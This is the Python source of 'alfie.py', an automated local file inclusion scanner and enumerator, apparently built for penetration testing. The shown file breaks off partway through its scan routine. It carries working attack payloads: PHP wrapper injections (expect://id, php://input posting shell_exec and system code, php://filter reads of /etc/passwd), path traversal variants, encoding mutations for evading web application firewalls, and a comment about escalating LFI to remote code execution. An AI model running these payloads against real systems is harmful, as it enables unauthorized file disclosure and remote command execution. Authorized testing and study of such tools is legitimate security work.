#!/usr/bin/env python3
import math
import random
import sys
import concurrent.futures
import requests
import argparse
import os
import time
import queue
import signal
import json
import mutation
import exrex
import re
import base64
# This is necessary for disabling the 'verify=False' warning:
import urllib3
urllib3.disable_warnings()

version_number = '2.1.0'

#
# NOTE TO SELF
# CHECK OUT 0XDF'S WALKTHROUGH ON YOUTUBE FOR PIKATWOO FOR TURNING LFI INTO RCE ON NGINX TARGETS!!!
#

def spinner(idx, message, prescale=0, carriage_rtn='\r'):
    # slow down the spinner by a factor of 2^x, where x is prescale
    state = chr(0x25E2 + ((idx >> prescale) % 4))
    print(f'  {state} {message}{carriage_rtn}', end='', flush=True)
    

def load_json_file(file_path):
    """
    Load a JSON file and parse it into a dictionary.

    Args:
    - file_path (str): The path to the JSON file.

    Returns:
    - dict: The parsed JSON data.

    Raises:
    - FileNotFoundError: If the file does not exist.
    - json.JSONDecodeError: If the file is not valid JSON.
    - Exception: For any other exceptions.
    """
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        return data
    except FileNotFoundError as fnf_error:
        print(f"Error loading JSON file: {fnf_error}")
        sys.exit(1)
    except json.JSONDecodeError as json_error:
        print(f"Error decoding JSON: {json_error}")
        sys.exit(1)
    except Exception as error:
        print(f"An unexpected error occurred: {error}")
        sys.exit(1)

# This is just to make the Help text more informative:
all_files_dict = load_json_file('file-list.json')
all_keywords = {'any'}
filename_length_bounds = [999,0]
for x in all_files_dict:
    for e in x.get('conditions'):
        all_keywords.add(e)
    filename_length = len(x.get('path'))
    if filename_length < filename_length_bounds[0]:
        filename_length_bounds[0] = filename_length
    if filename_length > filename_length_bounds[1]:
        filename_length_bounds[1] = filename_length
all_keywords_string = ', '.join(list(all_keywords))


parser = argparse.ArgumentParser(
    prog='alfie.py',
    description='''The Automatic Local File Inclusion Enumerator.
    Scan websites for local file inclusion vulnerabilities.''',
    epilog='Author: 4wayhandshake')
mode_help = '''Mode of operation: "scan", "enumerate", or "batch". 
Use "scan" to find a valid path traversal. The program will make requests using various traversals until at least one non-relative filepath is found.
Use "enumerate" to .
Use "batch" to enter scan mode, then (if successful) proceed to enumerate afterwards.
'''
target_system_help = (f'List of attributes of the target system, to help choose what files to check for. '
                      f'No spaces. Ex "linux,php". Choose attributes from this list:\n{all_keywords_string}')

parser.add_argument('-u', '--url', dest='url', help='Base URL of the target. Ex. "http://mywebsite.tld/index.php?page="', type=str, required=True)

display_args = parser.add_argument_group('Display / Output', 'Affect the way that Alfie looks')
display_args.add_argument('--version', action='version', version=f'%(prog)s {version_number}')
display_args.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Show extra output to console. Does not affect log file verbosity.')
display_args.add_argument('--no-color', dest='colorless', action='store_true', help='Don\'t ANSII color escapes in console output.')
display_args.add_argument('--quiet', dest='quiet', action='store_true', help='Don\'t print the banner or options.')
display_args.add_argument('-o', '--output', dest='output', help='File to log positive results.', type=str)

traversal_args = parser.add_argument_group('Traversal', 'Affect the bounds and method of traversal')
traversal_args.add_argument('--min', dest='min', help='Minimum number of steps "back" to traverse.', type=int, default=0)
traversal_args.add_argument('--max', dest='max', help='Maximum number of steps "back" to traverse.', type=int, default=10)

request_args = parser.add_argument_group('Request', 'Affect how requests are sent to the target')
request_args.add_argument('--target_system', dest='target_system', help=target_system_help, type=str, default='any')
request_args.add_argument('-t', '--threads', dest='threads', help='Number of threads to use for processing.', type=int, default=10)
request_args.add_argument('--timeout', dest='timeout', help='Timeout for each request (in seconds).', type=int, default=5)
request_args.add_argument('-X', '--request-type', dest='request_type', help='Type of HTTP request to use. Ex "POST".', type=str, default='GET')
request_args.add_argument('-b', '--cookies', dest='cookies', help='Cookies to include in each request. Ex "key1=value1; key2=value2" (Tip: use document.cookie in browser console)', type=str)
request_args.add_argument('-H', '--headers', dest='headers', help='Extra headers to include in each request. Use semicolons as a separator. Ex "Host: 4wayhandshake.test.tld; Authorization: Bearer 23456.hgfds.234567890"', type=str)
request_args.add_argument('-d', '--data', dest='data', help='Data to include in each request. Only applies if using a POST request (see -X option). Ex "key1=value1; key2=value2".', type=str)

response_args = parser.add_argument_group('Response', 'Affect how responses are received and processed')
response_args.add_argument('-fs', '--filter-sizes', dest='filter_sizes', help='Comma-separated list of sizes (in bytes) to filter from the results.', type=str)
response_args.add_argument('-fw', '--filter-words', dest='filter_words', help='Comma-separated list of word counts to filter from the results.', type=str)
response_args.add_argument('-fc', '--filter-codes', dest='filter_codes', help='Comma-separated list of HTTP status codes to filter from the results.', type=str)

mode_subparsers = parser.add_subparsers(dest='mode', required=True, help='Mode of operation.')
filter_mode_parser = mode_subparsers.add_parser('filter', help='Attempt to establish a baseline of which responses should be filtered. The most likely filters will be suggested')
scan_mode_parser = mode_subparsers.add_parser('scan', help='Find a valid path traversal. The program will make requests using various traversals until at least one non-relative filepath is found.')
enum_mode_parser = mode_subparsers.add_parser('enum', help='Use a known path traversal, and try to enumerate files on the target system. If possible, attempts will be made to gain RCE')
batch_mode_parser = mode_subparsers.add_parser('batch', help='Automatically run \"filter\" mode, then \"scan\" mode, then \"enum\" mode')

scan_mode_parser.add_argument_group('scan', 'Arguments for "scan" mode')
scan_mode_parser.add_argument('-rel', '--relative-only', dest='relative_only', action='store_true', help='Only use relative paths in scan mode. Great for finding files like package.json (Defaults to false when not specified)')

enum_mode_parser.add_argument_group('enum', 'Arguments for "enum" mode')
enum_mode_parser.add_argument('-ex', '--example-lfi', dest='example_lfi', help='Example of a traversal that successfully discloses a local file (the bold part of the output of "scan" mode) Ex. "/../../../etc/passwd"', type=str, required=True)
enum_mode_parser.add_argument('-nx', '--no-extra-tests', dest='no_extra_tests', action='store_true', help='Don\'t run the extra LFI tests (only useful for WAF evasion).')


args = parser.parse_args()

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\x1b[1m'
    UNBOLD = '\x1b[0m'

banner_colorless = '''
           ,ggg,
          dP""8I   ,dPYb, ,dPYb,                   ,,,,,,,,,,,,
         dP   88   IP'`Yb IP'`Yb                  : AUTOMATIC  :
        dP    88   I8  8I I8  8I   gg             : LOCAL      :
       ,8'    88   I8  8' I8  8'   ""             : FILE       :
       d88888888   I8 dP  I8 dP    gg    ,ggg,    : INCLUSION  :
 __   ,8"     88   I8dP   I8dP     88   i8" "8i   : ENUMERATOR :
dP"  ,8P      Y8   I8P    I8P      88   I8, ,8I    ````````````
Yb,_,dP       `8b,,d8b,_ ,d8b,_  _,88,_ `YbadP'    by
 "Y8P"         `Y88P'"Y88PI8"88888P""Y8888P"Y888   4wayhandshake
                          I8 `8,                        🤝🤝🤝🤝
//#//#//#//#//#//#//#//#/ I8  `8, //#//#//#//#//
                          I8   8I
                          I8   8I
                          I8, ,8'
                           "Y8P'
'''

banner = '''\033[94m
           ,ggg,
          dP""8I   ,dPYb, ,dPYb,                  \033[92m ,,,,,,,,,,,,  \033[0m \033[94m
         dP   88   IP'`Yb IP'`Yb                  \033[92m: \x1b[1mA\x1b[0m\033[92mUTOMATIC  : \033[0m \033[94m
        dP    88   I8  8I I8  8I   gg             \033[92m: \x1b[1mL\x1b[0m\033[92mOCAL      : \033[0m \033[94m
       ,8'    88   I8  8' I8  8'   ""             \033[92m: \x1b[1mF\x1b[0m\033[92mILE       : \033[0m \033[94m
       d88888888   I8 dP  I8 dP    gg    ,ggg,    \033[92m: \x1b[1mI\x1b[0m\033[92mNCLUSION  : \033[0m \033[94m
 __   ,8"     88   I8dP   I8dP     88   i8" "8i   \033[92m: \x1b[1mE\x1b[0m\033[92mNUMERATOR : \033[0m \033[94m
dP"  ,8P      Y8   I8P    I8P      88   I8, ,8I   \033[92m ```````````` \033[0m \033[94m
Yb,_,dP       `8b,,d8b,_ ,d8b,_  _,88,_ `YbadP'   \033[92m by \033[0m \033[94m
 "Y8P"         `Y88P'"Y88PI8"88888P""Y8888P"Y888  \033[92m 4wayhandshake \033[0m \033[94m
                          I8 `8,                        🤝🤝🤝🤝
//#//#//#//#//#//#//#//#/ I8  `8, //#//#//#//#//
                          I8   8I
                          I8   8I
                          I8, ,8'
                           "Y8P'\033[0m
'''
# See https://manytools.org/hacker-tools/ascii-banner/ for banner creation
# Font (nscript) by Normand Veilleux <nveilleu@emr.ca> Oct 7, 1994
# figletized by Peter Samuelson <psamuels@hmc.edu> Nov 29, 1994

# These are the extra tests to run, before enumerating path traversals
# Each should have (at least) a description, method, and url, and
# criteria for success (a series of checks to run on the response object)
extra_tests = [
    {
        'description': 'Checking for insecure PHP wrapper "expect":',
        'method': 'GET',
        'url': 'expect://id',
        'success_criteria': {
            # response should at least contain the string "uid"
            'contains': 'uid'
        }
    },
    {
        'description': 'Checking for insecure PHP wrapper "input":',
        'method': 'POST',
        'url': 'php://input&cmd=id',
        'data': "<?php echo shell_exec($_GET['cmd']); ?>",
        'success_criteria': {
            # response should at least contain the string "uid"
            'contains': 'uid='
        }
    },
    {
        'description': 'Checking for insecure PHP wrapper "input":',
        'method': 'POST',
        'url': 'php://input',
        'data': "<?php system('id'); ?>",
        'success_criteria': {
            # response should at least contain the string "uid"
            'contains': 'uid='
        }
    },
    {
        'description': 'Checking for insecure PHP wrapper "filter":',
        'method': 'GET',
        'url': 'php://filter/resource=../../../../../../../../etc/passwd',
        'success_criteria': {
            # response should include part of the base64 encoding of the root user
            'contains': 'root:'
        }
    },
    {
        'description': 'Checking for insecure PHP wrapper "filter" with b64 encoding:',
        'method': 'GET',
        'url': 'php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd',
        'success_criteria': {
            # response should include part of the base64 encoding of the root user
            'contains': 'cm9vdDp4'
        }
    }
]

traversals = [
    '../',
    '..\\',
    '....//',
    '..././',
    '....\\/',
    '....////'
]

#endings = ['', '%00', './'*2048]
endings = ['', '%00']

mutations = [
    mutation.identity,
    mutation.urlencode_specialchars,
    mutation.urlencode_morechars,
    mutation.double_urlencode_specialchars,
    mutation.double_urlencode_morechars
]

bypasses = [
    mutation.identity,
    mutation.slash_bypass
]

s = requests.session()
exit_flag = False # Global flag to signal threads to exit

# Use some globals to store info used in every request
filter_codes = []
filter_sizes = []
filter_words = []
request_cookie = None
request_headers = None
request_data = None
files_to_test = []
max_request_index = -1
successes = {}


def string_to_dict(s):
    if s is None:
        return None
    # Parse a cookie-like string into a dict
    key_value_pairs = [e.strip() for e in s.split(';')]
    dict = {}
    for kvp in key_value_pairs:
        k, v = kvp.split('=',1)
        # According to the HTTP cookie specification (RFC 6265),
        # cookie values cant contain semicolon, comma, or whitespace
        if any((c == ';' or c == ',' or c.isspace()) for c in v):
            raise ValueError
        dict[k] = v
    if len(dict) == 0:
        raise ValueError
    return dict


def parse_cookie(s):
    if s is None:
        return None
    cookie_dict = string_to_dict(s)
    # return a requests cookiejar from a dictionary
    return requests.utils.cookiejar_from_dict(cookie_dict)

def parse_headers(s):
    _header_strings = [h.lstrip() for h in s.split(';')]
    header_dict = {}
    for h in _header_strings:
        _h_parts = h.split(':')
        if len(_h_parts) != 2:
            raise ValueError
        _h_key = _h_parts[0].rstrip()
        _h_val = _h_parts[1].lstrip().rstrip()
        header_dict[_h_key] = _h_val
    return header_dict

def parse_data(s):
    return string_to_dict(s)


def comma_separated_numbers_or_ranges(s):
    """
    :param s: a comma-separated string of integers and ranges, with no spaces. Ex. "4,3,7-9,15"
    :return: list of all integers inclusive to the ranges, or the integers themselves. Ex. [3,4,7,8,9,15]
    """
    numbers = []
    for ss in s.split(','):
        try:
            if '-' in ss:
                r = [int(x) for x in ss.split('-')]
                if len(r) != 2:
                    raise ValueError
                for x in range(min(r), max(r)+1):
                    numbers.append(int(x))
            else:
                numbers.append(int(ss))
        except ValueError:
            print(f'Invalid argument provided: "{s}"\n'
                  f'Please provide comma-separated integers/ranges, with no spaces. Ex. "4,3,7-9,15"')
            sys.exit(1)
    return sorted(numbers)


def validate_args():

    def is_positive_int(x):
        return x >= 0

    def all_positive_ints(l):
        for e in l:
            if not is_positive_int(e):
                return False
        return True

    if args.request_type.upper() not in ['GET','POST']:
        print("Invalid request type provided. Only GET and POST are supported")
        sys.exit(1)

    if not is_positive_int(args.min):
        print("Invalid minimum traversal depth provided (must be at least 0)")
        sys.exit(1)

    if not is_positive_int(args.max) or args.max < args.min:
        print("Invalid maximum traversal depth provided (must be greater than or equal to min depth)")
        sys.exit(1)

    if args.filter_codes:
        global filter_codes
        filter_codes = comma_separated_numbers_or_ranges(args.filter_codes)
        if not all_positive_ints(filter_codes):
            print("Invalid filter-codes argument. All must be positive integers")
            sys.exit(1)

    if args.filter_sizes:
        global filter_sizes
        filter_sizes = comma_separated_numbers_or_ranges(args.filter_sizes)
        if not all_positive_ints(filter_sizes):
            print("Invalid filter-sizes argument. All must be positive integers")
            sys.exit(1)

    if args.filter_words:
        global filter_words
        filter_words = comma_separated_numbers_or_ranges(args.filter_words)
        if not all_positive_ints(filter_words):
            print("Invalid filter-words argument. All must be positive integers")
            sys.exit(1)

    if args.cookies:
        global request_cookie
        try:
            request_cookie = parse_cookie(args.cookies)
        except ValueError as e:
            if args.colorless:
                print(f'Warning: invalid cookies provided.\nPlease use this format: "key1=value1; key2=value2".\nProceeding without cookies.\n')
            else:
                print(f'{colors.MAGENTA}Warning: invalid cookies provided.{colors.END}\nPlease use this format: "key1=value1; key2=value2".\nProceeding without cookies.\n')
            request_cookie = None
        except Exception as e:
            if args.colorless:
                print(f'An error occurred while parsing cookies:\n{e}\n')
            else:
                print(f'{colors.MAGENTA}An error occurred while parsing cookies:{colors.END}\n{e}\n')
            sys.exit(1)
    
    if args.headers:
        global request_headers
        custom_headers = {}
        try:
            custom_headers = parse_headers(args.headers)
        except ValueError as e:
            if args.colorless:
                print(f'Warning: invalid headers provided.\nPlease list all custom headers using a semicolon as a separator: Ex "Host: something; Authorization: bearer blahblahblah".\nProceeding without custom headers...\n')
            else:
                print(f'{colors.MAGENTA}Warning: invalid headers provided.{colors.END}\nPlease list all custom headers using a semicolon as a separator: Ex "Host: something; Authorization: bearer blahblahblah".\nProceeding without cookies.\n')
        default_headers = requests.utils.default_headers()
        request_headers = {**default_headers, **custom_headers}

    if args.data:
        global request_data
        try:
            request_data = parse_data(args.data)
        except ValueError as e:
            if args.colorless:
                print(f'Warning: invalid request data provided.\nPlease use this format: "key1=value1; key2=value2".\nProceeding without request data.\n')
            else:
                print(f'{colors.MAGENTA}Warning: invalid request data provided.{colors.END}\nPlease use this format: "key1=value1; key2=value2".\nProceeding without request data.\n')
            request_data = None
        except Exception as e:
            if args.colorless:
                print(f'An error occurred while parsing request data:\n{e}\n')
            else:
                print(f'{colors.MAGENTA}An error occurred while parsing request data:{colors.END}\n{e}\n')
            sys.exit(1)

    if args.target_system:
        targets = args.target_system.split(',')
        if not all([t in all_keywords for t in targets]):
            print(f'Invalid list of target_system provided: "{args.target_system}".\n'
                  f'Provide a comma-separated list (without spaces), of any of these: {all_keywords_string}')
            sys.exit(1)


def loadWordlist(filename):
    if (filename[0] in '/\\'):
        # absolute path was provided
        filepath = filename
    else:
        # relative path was provided
        filepath = os.path.join(os.path.dirname(__file__), filename)
    # Read the file, remove the whitespace from each line
    with open(filepath, 'r') as f:
        return [ line.rstrip() for line in f.readlines() ]


def load_files_list(targets_string):
    global files_to_test
    for f in all_files_dict:
        if any([(target.lower() == 'any' or target.lower() in f.get('conditions')) for target in targets_string.split(',')]):
            files_to_test.append(f)
    for ftt in files_to_test:
        ftt["found"] = False


def matches(resp, url):
    ret = True
    code = int(resp.status_code)
    byte_count = len(resp.content)
    word_count = len(resp.text.split())
    if code in filter_codes:
        ret = False
    if byte_count in filter_sizes:
        ret = False
    if word_count in filter_words:
        ret = False
    # if ret:
    #     if args.verbose:
    #         if args.colorless:
    #             print(f"{' '*64}\n[+] {url:<60}\n    HTTP {code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    #         else:
    #             print(f"{' '*64}\n{colors.GREEN}[+] {url:<60}{colors.END}\n    HTTP {code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    #     else:
    #         if args.colorless:
    #             print(f"[+] {url:<60}")
    #         else:
    #             print(f"{colors.GREEN}[+] {url:<60}{colors.END}")
    # elif args.verbose:
    #     if args.colorless:
    #         print(f"{' '*64}\n[-] {url:<60}\n    HTTP {code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    #     else:
    #         print(f"{' '*64}\n{colors.RED}[-] {url:<60}{colors.END}\n    HTTP {code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    return ret


def make_request(method, url, req_cookie, req_headers, req_json, req_data=None):
    try:
        if method == 'POST':
            response = requests.post(url, cookies=req_cookie, headers=req_headers, json=req_json, data=req_data, timeout=args.timeout)
        else:
            response = requests.get(url, cookies=req_cookie, headers=req_headers, data=req_data, timeout=args.timeout)
        # if args.verbose:
        #     code = int(response.status_code)
        #     num_bytes = len(response.content)
        #     num_words = len(response.text.split())
        #     print(f"{' '*64}\n[+] {url:<60}\n    HTTP {code:<8} Size: {num_bytes:<12} Words: {num_words:<20}")
        return response
    except requests.RequestException as e:
        if args.colorless:
            print(f'An error occurred while making a request to {url}:\n{e}\n')
        else:
            print(f'{colors.MAGENTA}An error occurred while making a request to {url}:{colors.END}\n{e}\n')
        return None


def find_longest_base64_segment(sample):
    def is_base64_segment(segment):
        try:
            if len(segment) % 4 == 0:
                base64.b64decode(segment, validate=True)
                return True
            return False
        except Exception:
            return False

    base64_pattern = re.compile(r'[A-Za-z0-9+/=]+')
    segments = base64_pattern.findall(sample)
    valid_segments = [seg for seg in segments if is_base64_segment(seg)]
    if not valid_segments:
        return None
    return max(valid_segments, key=len)

def process_urls(job_queue, exit_on_success=False, ignore_filters=False, show_results=False):
    global exit_flag, max_request_index
    total_jobs_approx = f'{20 * round(job_queue.qsize() / 20)}ish'
    while not exit_flag:
        try:
            job = job_queue.get(timeout=1)
            if job is not None:
                spinner(job['idx'], f'Processing... ({job['idx']}/{total_jobs_approx})')
                url = job.get('url')
                method = args.request_type.upper()
                resp = make_request(method, url, request_cookie, request_headers, request_data)
                if (resp is not None) and (ignore_filters or matches(resp, url)):
                    if 'expect_base64' in job:
                        b64 = find_longest_base64_segment(resp.text)
                        if len(b64) > 40:
                            try:
                                job['decoded'] = base64.b64decode(b64, validate=True)
                            except Exception as e:
                                print(f'An exception occurred while attempting to base64-decode a result:\n{b64}')
                                continue
                    job['numerics'] = {
                        'status_code': resp.status_code,
                        'byte_count': len(resp.content),
                        'word_count': len(resp.text.split())
                    }
                    global successes
                    # Initialize this entry if it's the first time finding this file
                    if job['filepath'] not in successes:
                        successes[job['filepath']] = []
                    successes[job['filepath']].append(job)
                    if exit_on_success:
                        exit_flag = True
                    if show_results:
                        show_result(job)
                if job['idx'] > max_request_index:
                    max_request_index = job['idx']
                job_queue.task_done()
        except queue.Empty:
            exit_flag = True
            continue
        except Exception as e:
            print(e)


def show_result(job):
    # Any job passed to this function should have been "successful", but just make sure anyway
    if 'numerics' not in job:
        print(f'Unsuccessful job was passed to show_result():\n{json.dumps(job,indent="    ")}')
        return
    #lfi = job['url'][len(args.url):]
    lfi = job['url']
    status_code = job['numerics']['status_code']
    byte_count = job['numerics']['byte_count']
    word_count = job['numerics']['word_count']
    if args.verbose:
        if args.colorless:
            print(f"{' ' * 64}\n[+] {lfi:<60}\n    HTTP {status_code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
        else:
            print(f"{' ' * 64}\n{colors.GREEN}[+] {lfi:<60}{colors.END}\n    HTTP {status_code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    else:
        if args.colorless:
            print(f"[+] {lfi:<60}")
        else:
            print(f"{colors.GREEN}[+] {lfi:<60}{colors.END}")


def signalHandler(signum, frame):
    global exit_flag
    exit_flag = True
    print("\nCancelling jobs. One sec...\n")


def writeLogfile(filename, successful_urls):
    if (filename[0] in '/\\'):
        filepath = filename # absolute path was provided
    else:
        # relative path was provided
        filepath = os.path.join(os.path.dirname(__file__), filename)
    try:
        with open(filepath, 'w') as f:
            for url in successful_urls:
                f.write(url+'\n')
    except FileNotFoundError:
        print(f"Error: The file \'{filepath}\' could not be found.")
    except PermissionError:
        print(f"Error: Permission denied. Unable to write to the file \'{filepath}\'.")
    except Exception as e:
        print(f"While writing the output file, an unexpected error occurred: {e}")


def print_options(mode):
    print('='*64)
    print(f'URL: {args.url:>59}')
    if args.verbose:
        print(f'Verbose mode: {"enabled":>50}')

    if args.mode == "filter":
        pass
    elif args.mode == "scan":
        if args.relative_only:
            print(f'Only scanning relative paths: {str(args.relative_only):>34}')
    elif args.mode == "enum":
        print(f'Example LFI: {args.example_lfi:>51}')
        print(f'No extra tests: {str(args.no_extra_tests):>47}')

    if args.min != parser.get_default('min'):
        print(f'Minimum traversal steps: {args.min:>39}')
    if args.max != parser.get_default('max'):
        print(f'Maximum traversal steps: {args.max:>39}')
    if args.threads != parser.get_default('threads'):
        print(f'Threads: {args.threads:>55}')
    if args.filter_codes != parser.get_default('filter_codes'):
        print(f'HTTP code filter: {args.filter_codes.upper():>46}')
    if args.filter_sizes != parser.get_default('filter_sizes'):
        print(f'Size filter (bytes): {args.filter_sizes:>43}')
    if args.filter_words != parser.get_default('filter_words'):
        print(f'Word count filter (# words): {args.filter_words:>35}')
    if args.timeout != parser.get_default('timeout'):
        print(f'Timeout: {args.timeout:>54}s')
    if args.request_type != parser.get_default('request_type'):
        print(f'Request type: {args.request_type.upper():>50}')
    if args.cookies:
        print(f'Cookies: {args.cookies:>55}')
    if args.headers:
        print(f'Headers: {args.headers:>55}')
    if args.data:
        print(f'Data: {args.data:>58}')
    if args.output:
        print(f'Output file: {args.output:>51}')
    if args.colorless:
        print(f'Colorless mode: {"omit ANSII color codes in all output":>48}')
    print('='*64+'\n')


def runExtraTests(tests):

    def testSuccess(criteria, response):
        # all of the criteria must be met for the test to be considered successful
        # Check the status code
        criterion = criteria.get('code', None)
        if criterion is not None:
            if response.status_code != criterion:
                return False
        # Check if the response is the right size (in bytes)
        criterion = criteria.get('size', None)
        if criterion is not None:
            if len(response.content) != criterion:
                return False
        # Check if the response is the right size
        criterion = criteria.get('words', None)
        if criterion is not None:
            if len(response.text.split()) != criterion:
                return False
        # Check if body contains the substring
        criterion = criteria.get('contains', None)
        if criterion is not None:
            if response.text.find(criterion) == -1:
                return False
        return True

    if args.verbose:
        print("Running extra tests...")
    for test in tests:
        # Collect components of the request
        #ending = args.ending if args.ending else ''
        uri_base = f'{args.url}{test.get("url","")}'
        c = request_cookie
        h = request_headers
        d = test.get('data', None)
        terminations = [''] if args.no_ending_checks else endings
        # Print a message stating which test is happening
        payload_output = ''
        if d is not None:
            payload_output = f'\n    Payload: {d:<55}'
        if args.verbose:
            if args.colorless:
                print(f"{' '*64}\n[?] {test['description']}{payload_output}")
            else:
                print(f"{' '*64}\n{colors.YELLOW}[?] {test['description']:<60}{colors.END}{payload_output}")
        # issue the request then test the response
        method = test['method']
        for termination in terminations:
            uri = f'{uri_base}{termination}'
            resp = make_request(method, uri, req_cookie=c, req_headers=h, req_json=None, req_data=d)
            if testSuccess(test['success_criteria'], resp):
                if args.verbose:
                    if args.colorless:
                        print(f"[+] {method + ' ' + uri:<60}\n    Passed checks: {''.join(test['success_criteria'].keys()):<45}")
                    else:
                        print(f"{colors.GREEN}[+] {method + ' ' + uri:<60}{colors.END}\n    Passed checks: {''.join(test['success_criteria'].keys()):<45}")
                else:
                    if args.colorless:
                        print(f"[+] {method + ' ' + uri:<60}")
                    else:
                        print(f"{colors.GREEN}[+] {method + ' ' + uri:<60}{colors.END}")
            elif args.verbose:
                if args.colorless:
                    print(f"[-] {method + ' ' + uri:<60}\n    Failed check(s): {''.join(test['success_criteria'].keys()):<41}")
                else:
                    print(f"{colors.RED}[-] {method + ' ' + uri:<60}{colors.END}\n    Failed check(s): {''.join(test['success_criteria'].keys()):<41}")
    if args.verbose:
        print("\nDone running extra tests.")


def probe_for_filters(repetitions):
    """
    Try a bunch of requests, using the mutations and bypasses that we might
    utilize in "scan" mode. These requests should all be 'negative' results.
    Collect counts of status_code, byte_count, and word_count for the requests.
    Try to discern very common status_code, byte_count, and word_counts, then
    set those as the filters for the rest of the program.
    :param repetitions: number of times to resample each combination of traversal, encoding, etc.
    :return: a dictionary with suggested filters, and the probabilities they occur at
    """
    def random_ele(lst):
        return lst[random.randint(0,len(lst)-1)]

    def random_filename(length):
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'
        s = ''
        for _ in range(length):
            s += random_ele(alphabet)
        return s

    def dict_argmax(d):
        return max(d, key=d.get)

    def calc_basic_stats(d):
        """
        :param d: dictionary where keys are the manip variable and values are the responding variable
        :return: (count,sum,average,stddev)
        """
        N = len(d)
        Sigma = sum(d.values())
        mu = Sigma / N
        sigma = math.sqrt(sum((x-mu)**2 for x in d.values()) / N)
        return {
            'count': N,
            'min': min(d.values()),
            'max': max(d.values()),
            'sum': Sigma,
            'mean': mu,
            'stddev': sigma
        }

    def find_high_outliers(d, mu, sigma, scale=1.0):
        # Return the keys of all values that are more than `scale` standard deviations from the mean
        outliers = []
        for (k, v) in d.items():
            if abs(v - mu) >= (sigma * scale):
                outliers.append(k)
        return outliers

    def probability(mu, sigma, sample_value):
        # Probability density function for the normal distribution
        print(mu, sigma, sample_value)
        if sigma == 0:
            if sample_value == mu:
                return 1.0
            return 0
        return (1 / (sigma * math.sqrt(2 * math.pi))) * math.exp(-((sample_value - mu) ** 2) / (2 * sigma ** 2))

    extensions = ['', '.php', '.js', '.py', '.ini', '.sys', '.bat']

    # dicts to hold the results of requests
    status_codes_counts = {}
    byte_count_counts = {}
    word_count_counts = {}

    # Create a queue of requests to make
    job_queue = queue.Queue()

    idx = 0
    for slash in ['', '/']:
        for traversal in traversals:
            for ending in endings:
                for _mutation in mutations:
                    for _bypass in bypasses:
                        for _ in range(repetitions):
                            filepath = random_filename(random.randint(filename_length_bounds[0], filename_length_bounds[1])) + random_ele(extensions)
                            base_resource = f'{slash}{traversal}{filepath}{ending}'
                            modified_resource = _bypass(_mutation(base_resource))
                            url = args.url + modified_resource
                            # Enqueue the request
                            job = {
                                "filepath": filepath,
                                "traversal": traversal,
                                "depth": 1,
                                "leading_slash": (slash == '/'),
                                "ending": ending,
                                "mutation": _mutation.__name__,
                                "bypass": _bypass.__name__,
                                "url": url,
                                "idx": idx
                            }
                            job_queue.put(job)
                            idx += 1
                            
    # Reset the successes dict
    global successes
    successes = {}
    # Start issuing requests
    total_jobs = concurrent_async_requests(job_queue, exit_early=False, ignore_filters=True)

    # Count up the results
    for filepath in successes:
        for job in successes[filepath]:
            if ('numerics' not in job or
                    not all([k in job['numerics'] for k in ['status_code', 'byte_count', 'word_count']])):
                print(f'Job has no "numerics" key, or "numerics" lacks the necessary keys.'
                      f' Can\'t analyze the success of of the response to the request!')
                return None
            resp_code =  job['numerics']['status_code']
            resp_size =  job['numerics']['byte_count']
            resp_words = job['numerics']['word_count']
            if resp_code not in status_codes_counts:
                status_codes_counts[resp_code] = 0
            if resp_size not in byte_count_counts:
                byte_count_counts[resp_size] = 0
            if resp_words not in word_count_counts:
                word_count_counts[resp_words] = 0
            status_codes_counts[resp_code] += 1
            byte_count_counts[resp_size] += 1
            word_count_counts[resp_words] += 1

    status_code_stats = calc_basic_stats(status_codes_counts)
    byte_count_stats = calc_basic_stats(byte_count_counts)
    word_count_stats = calc_basic_stats(word_count_counts)

    probable_fc = [(k, (status_codes_counts[k]/status_code_stats['sum']))
                   for k in find_high_outliers(status_codes_counts,
                                               status_code_stats['mean'],
                                               status_code_stats['stddev'],
                                               scale=1.5)]
    probable_fs = [(k, (byte_count_counts[k]/byte_count_stats['sum']))
                   for k in find_high_outliers(byte_count_counts,
                                               byte_count_stats['mean'],
                                               byte_count_stats['stddev'],
                                               scale=1.5)]
    probable_fw = [(k, (word_count_counts[k]/word_count_stats['sum']))
                   for k in find_high_outliers(word_count_counts,
                                               word_count_stats['mean'],
                                               word_count_stats['stddev'],
                                               scale=0)]

    # If we didn't find any outliers, just suggest a byte size filter
    if len(probable_fc) == 0 and len(probable_fs) == 0 and len(probable_fw) == 0:
        probable_fs = [(round(byte_count_stats['mean']), 1.0)]
    
    return {
        'num_requests': total_jobs,
        'fc': {
            'candidates': probable_fc
        },
        'fs': {
            'candidates': probable_fs,
            'range': [byte_count_stats.get('min'), byte_count_stats.get('max')]
        },
        'fw': {
            'candidates': probable_fw,
            'range': [word_count_stats.get('min'), word_count_stats.get('max')]
        }
    }


def scan():
    """
    Perform the "scan" mode. The idea here is to disclose one file. Once we find one file,
    we will have found a successful combination of traversal pattern, depth of traversal,
    an encoding scheme, etc.
    Once "scan" mode finds this successful combination, we can greatly expedite "enum" mode.
    :return: True if a traversal was found, otherwise False.
    """
    # Do relative path files for 'scan' mode, then absolute path
    files_useful_for_scan = []
    files_useful_for_scan += [file_obj.get('path') for file_obj in all_files_dict if ("scan" in file_obj.get('applicable_modes',[]) and file_obj.get('absolute') == 0)]
    if not args.relative_only:
        files_useful_for_scan += [file_obj.get('path') for file_obj in all_files_dict if ("scan" in file_obj.get('applicable_modes',[]) and file_obj.get('absolute') == 1)]
    
    
    
    scan_target_files = [f for f in files_to_test if (f.get('path') in files_useful_for_scan)]
    # Create a queue of requests to make
    job_queue = queue.Queue()
    # index of request. They might not come out sequentially
    idx = 0
    # For increasing levels of depth...
    for depth in range(args.min, args.max + 1):
        request_queue = queue.Queue()
        # Show progress indicating what level of depth we're at?
        # For each file...
        for target_file in scan_target_files:
            # Don't try to find this file if the path is parameterized (those are for "enumerate" mode only)
            if 'variables' in target_file:
                continue
